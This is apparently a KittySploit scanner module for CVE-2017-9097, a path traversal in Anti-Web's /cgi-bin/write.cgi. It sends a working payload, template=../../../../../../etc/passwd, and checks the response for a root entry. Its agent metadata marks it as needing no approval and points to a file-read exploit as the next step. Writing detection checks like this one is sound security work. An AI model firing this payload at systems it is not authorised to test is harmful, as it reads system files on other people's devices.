#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Anti-Web write.cgi template path traversal (CVE-2017-9097)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Anti-Web - write.cgi LFI Detection (CVE-2017-9097)',
        'description': (
            'Detects CVE-2017-9097 by POSTing template=../../../../../../etc/passwd to '
            '/cgi-bin/write.cgi.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'antiweb', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/antiweb_cve_2017_9097_file_read',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-9097',
        ],
        'cve': 'CVE-2017-9097',
    }

    def run(self):
        data = 'page=/&template=../../../../../../etc/passwd'
        r = self.http_request(
            method='POST',
            path='/cgi-bin/write.cgi',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or '', re.I):
            self.set_info(
                severity='high',
                reason='Anti-Web write.cgi LFI (CVE-2017-9097)',
                path='/cgi-bin/write.cgi',
            )
            return True
        return False
